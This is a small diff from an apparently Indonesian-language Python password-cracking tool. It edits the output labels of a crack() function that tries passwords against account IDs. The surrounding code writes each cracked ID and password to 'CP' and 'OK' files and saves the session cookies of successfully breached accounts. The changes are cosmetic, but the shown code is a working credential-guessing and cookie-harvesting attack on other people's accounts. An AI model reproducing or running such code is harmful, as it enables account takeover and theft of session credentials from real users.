@@ -558,7 +558,7 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'[OK]  {idf} | {pw}'
+					statuscp = f'[cp]  {idf} | {pw}'
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='SESI'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -573,7 +573,7 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
+					statusok = f'[OK] {idf}\n | {pw}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title=' NO SESI'))
 					break
